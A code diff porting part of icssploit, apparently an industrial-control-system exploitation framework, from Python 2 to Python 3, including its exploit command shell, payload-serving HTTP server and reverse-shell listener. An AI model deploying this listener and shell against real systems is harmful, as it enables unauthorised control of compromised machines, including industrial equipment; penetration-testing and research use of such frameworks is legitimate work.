@@ -1,10 +1,11 @@
 import socket
-import telnetlib
-import SimpleHTTPServer
-import BaseHTTPServer
+import http.server
+import socketserver
 import threading
+import sys
+import select
 
-from printer import printer_queue
+from icssploit.printer import printer_queue
 
 from icssploit.utils import (
     print_info,
@@ -20,7 +21,7 @@ def shell(exploit, architecture="", method="", **params):
         while not printer_queue.empty():
             pass
 
-        cmd = raw_input("cmd > ")
+        cmd = input("cmd > ")
 
         if cmd in ["quit", "exit"]:
             return
@@ -49,7 +50,7 @@ def shell(exploit, architecture="", method="", **params):
             print_info(exploit.execute(cmd))
 
 
-class HttpRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
+class HttpRequestHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
@@ -62,7 +63,7 @@ class HttpRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
         return
 
 
-class HttpServer(BaseHTTPServer.HTTPServer):
+class HttpServer(socketserver.TCPServer):
     def serve_forever(self, content):
         self.stop = False
         self.content = content
@@ -480,6 +481,26 @@ class reverse_shell(object):
         print_status("Connection from {}:{}".format(addr[0], addr[1]))
 
         print_success("Enjoy your shell")
-        t = telnetlib.Telnet()
-        t.sock = client
-        t.interact()
+        
+        # Simple socket-based shell interaction
+        try:
+            while True:
+                # Check if there's data to read from the socket
+                ready_to_read, _, _ = select.select([client], [], [], 0.1)
+                if ready_to_read:
+                    data = client.recv(1024)
+                    if not data:
+                        break
+                    sys.stdout.write(data.decode('utf-8', errors='ignore'))
+                    sys.stdout.flush()
+                
+                # Check if there's input from stdin
+                ready_to_read, _, _ = select.select([sys.stdin], [], [], 0.1)
+                if ready_to_read:
+                    user_input = sys.stdin.readline()
+                    if user_input:
+                        client.send(user_input.encode('utf-8'))
+        except KeyboardInterrupt:
+            print_status("Shell session ended")
+        finally:
+            client.close()
